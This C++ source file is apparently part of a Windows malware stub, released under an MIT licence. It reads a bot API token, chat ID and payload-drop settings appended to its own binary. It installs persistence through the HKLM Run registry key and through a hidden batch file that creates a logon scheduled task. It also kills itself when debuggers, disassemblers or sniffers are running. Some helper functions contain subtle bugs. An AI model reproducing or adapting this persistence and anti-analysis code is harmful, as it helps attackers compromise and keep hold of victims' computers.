/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "Manager.h"
#include "Requests.h"

long GetFileSize(const char* filename)
{
    struct stat stat_buf;
    int rc = stat(filename, &stat_buf);
    return rc == 0 ? stat_buf.st_size : -1;
}

void ReadData(Settings* s) {
	char mePath[128] = { 0 };
	GetModuleFileNameA(NULL, mePath, sizeof(mePath) - 1);

	int filesize = GetFileSize(mePath) - sizeof(Settings);

	std::ifstream stub(mePath, std::ifstream::binary);
	stub.seekg(filesize);

	stub.read((char*)&s->botapi, sizeof(s->botapi));
	stub.read((char*)&s->chatid, sizeof(s->chatid));
	stub.read((char*)&s->drop, sizeof(s->drop));
	stub.read((char*)&s->drop_run, sizeof(bool));

	stub.read((char*)&s->scheduler_name, sizeof(s->scheduler_name));
	stub.read((char*)&s->scheduler_state, sizeof(bool));

	stub.read((char*)&s->client_delay, sizeof(s->client_delay));
	stub.read((char*)&s->autorun, sizeof(s->autorun));
	stub.read((char*)&s->autorun_state, sizeof(bool));

	stub.read((char*)&s->auto_delete, sizeof(bool));
	stub.read((char*)&s->protect_debuggers, sizeof(bool));

	stub.close();
}

void Autorun(const char* path, const char* name) {
	HKEY reg_key = 0;
	const char* address = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, address, 0, KEY_ALL_ACCESS, &reg_key);

	result = RegSetValueEx(reg_key, path, 0, REG_SZ, (LPBYTE)path, sizeof(path) - 1);

	RegCloseKey(reg_key);
}

void Scheduler(const char* path, const char* name) {
	std::ofstream schd("scheduler.bat");
	schd << "@echo off \n";
	schd << "SCHTASKS /CREATE /SC ONLOGON /TN \"" + std::string(name) + "\" /TR \"" + std::string(path);
	schd.close();

	ShellExecuteA(0, "open", "scheduler.bat", 0, 0, SW_HIDE);
}

std::string ToLower(std::string str) {
	std::string lower = "";
	std::transform(str.begin(), str.end(), lower.begin(), ::tolower);
	return lower;
}

void Protector() {
	HANDLE hSnap;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	std::vector<std::string> processes = { "x64dbg", "x32dbg", "ollydbg", "ida", "debugger", "sniffer", "process"};
	std::string process = "";
	while (true) {
		Sleep(3000);
		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != NULL) {
			if (Process32First(hSnap, &pe32)) {
				do {
					process = ToLower(pe32.szExeFile);
					for (int i = 0; i < processes.size(); i++) {
						if (process.find(processes[i]) != std::string::npos) {
							ExitProcess(0);
						}
					}
				} while (Process32Next(hSnap, &pe32));
			}
		}
	}
}

bool FileExists(std::string name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}

std::vector<std::string> split(std::string str, char delim) {
	std::stringstream ss(str);
	std::string word;
	std::vector<std::string> splittened;
	while (std::getline(ss, word, delim))
	{
		splittened.push_back(word);
	}
	return splittened;
}